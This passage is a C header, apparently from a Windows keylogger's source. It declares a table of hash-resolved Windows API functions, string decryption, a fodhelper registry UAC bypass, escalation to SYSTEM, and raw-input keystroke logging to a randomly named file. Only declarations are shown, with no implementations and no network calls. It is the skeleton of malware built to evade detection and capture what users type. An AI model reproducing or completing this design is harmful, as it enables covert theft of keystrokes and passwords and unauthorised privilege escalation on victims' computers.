	PRTL_USER_PROCESS_PARAMETERS UserProcessInfo;
	DWORD64 PeBase;
	DWORD64 dwError;
	BOOL IsUsage;
	FILENAME_TABLE FileNames;


	CREATEPROCESSW CreateProcessW;
	NTCLOSE NtClose;
	NTCREATEFILE NtCreateFile;
	NTOPENPROCESSTOKENEX NtOpenProcessTokenEx;
	NTQUERYINFORMATIONFILE NtQueryInformationFile;
	NTQUERYINFORMATIONPROCESS NtQueryInformationProcess;
	NTQUERYINFORMATIONTOKEN NtQueryInformationToken;
	NTREADFILE NtReadFile;
	NTREADVIRTUALMEMORY NtReadVirtualMemory;
	NTSETINFORMATIONFILE NtSetInformationFile;
	NTWRITEFILE NtWriteFile;
	RTLALLOCATEHEAP RtlAllocateHeap;
	RTLCONVERTSIDTOUNICODESTRING RtlConvertSidToUnicodeString;
	RTLDOSPATHNAMETONTPATHNAME_U RtlDosPathNameToNtPathName_U;
	RTLFREEHEAP RtlFreeHeap;
	RTLFREEUNICODESTRING RtlFreeUnicodeString;
	RTLGETLASTWIN32ERROR RtlGetLastWin32Error;
	RTLNTSTATUSTODOSERROR RtlNtStatusToDosError;
	RTLTIMETOSECONDSSINCE1970 RtlTimeToSecondsSince1970;
	RTLVALIDSID RtlValidSid;
	ZWCLOSE ZwClose;
	ZWCREATEKEY ZwCreateKey;
	ZWSETVALUEKEY ZwSetValueKey;

	REGISTERCLASSEX vxRegisterClassEx;
	CREATEWINDOWEX vxCreateWindowEx;
	SENDMESSAGE vxSendMessage;
	GETMESSAGE vxGetMessage;
	TRANSLATEMESSAGE TranslateMessage;
	DISPATCHMESSAGE vxDispatchMessage;
	REGISTERRAWINPUTDEVICES RegisterRawInputDevices;
	GETKEYSTATE vxGetKeyState;
	TOASCII vxToAscii;
	GETKEYNAMETEXTW vxGetKeyNameTextW;
	MAPVIRTUALKEYW vxMapVirtualKey;
	GETKEYBOARDSTATE vxGetKeyboardState;
	DESTROYWINDOW vxDestroyWindow;
	DEFWINDOWPROCW vxDefWindowProcW;
}API_TABLE, *PAPI_TABLE;


//sub-routines
PPEB RtlGetPeb(VOID);
PTEB RtlGetTeb(VOID);
DWORD VxHashString(PBYTE String);
DWORD64 __stdcall ImportFunction(DWORD64 ModuleBase, DWORD64 Hash);
BOOL RtlLoadPeHeaders(PIMAGE_DOS_HEADER *Dos, PIMAGE_NT_HEADERS *Nt, PIMAGE_FILE_HEADER *File, PIMAGE_OPTIONAL_HEADER *Optional, PBYTE *ImageBase);

BOOL VxLoadNtDllFunctions(PAPI_TABLE Api);
BOOL VxLoadKernel32Functions(PAPI_TABLE Api);
BOOL VxGenerateFileNameTable(PAPI_TABLE Api);
BOOL VxLoadUser32Functions(PAPI_TABLE Api);

VOID VxSetLastError(DWORD dwError);
DWORD VxGetLastError(VOID);

PUNICODE_STRING VxGetPassword(VOID);
VOID VxDecrypt64(PWCHAR Key, PWCHAR String, DWORD32 dwSize, PWCHAR Out);

BOOL VxDetermineTargetAndEscalation(PAPI_TABLE Api);
BOOL VxCreateFodHelperRegistryKey(PUNICODE_STRING Parameters, PAPI_TABLE Api);
BOOL VxGetUserSid(PUNICODE_STRING uString, PAPI_TABLE Api);
BOOL VxExecuteFodHelper(PAPI_TABLE Api);

BOOL CreateCallbackEx(PAPI_TABLE Api, HINSTANCE hInstance, PFILENAME_TABLE Table);
DWORD VxGetEnvironmentVariableW(PAPI_TABLE Api, LPCWSTR Name, LPWSTR lpBuffer, DWORD dwSize);

DWORD VxSetFilePointer(PAPI_TABLE Api, HANDLE hFile, LONG lpDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);

//stdio recreation
VOID VxZeroMemory(PVOID Destination, SIZE_T Size);
VOID VxPseudoRandomStringGeneration(PWCHAR pBlock, HANDLE hHeap, PAPI_TABLE Api);
SIZE_T VxStringLength(LPCWSTR String);
INT VxPseudoRandom(VOID);
PWCHAR VxStringCopyW(PWCHAR String1, PWCHAR String2);
PWCHAR VxStringConcatW(PWCHAR String, PWCHAR String2);
PVOID VxCopyMemory(PVOID Destination, CONST PVOID Source, SIZE_T Length);
DWORD VxDecimalToAsciiW(PWCHAR String, LPDWORD dwArray, DWORD dwLength);
PWCHAR VxStringTokenW(PWCHAR String, CONST PWCHAR Delim);
PWCHAR VxCapString(PWCHAR Ptr);
INT VxStringCompare(LPCWSTR String1, LPCWSTR String2);
PWCHAR VxSecureStringCopy(PWCHAR String1, LPCWSTR String2, SIZE_T Size);

//keylogging routines
LRESULT CALLBACK WndProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam);
HANDLE VxCreateDataFile(PAPI_TABLE Api);
BOOL VxLogInput(PAPI_TABLE Api, HANDLE hLog, UINT Key);

//escalation routines
BOOL VxEscalateToSystemEx(PAPI_TABLE Api);
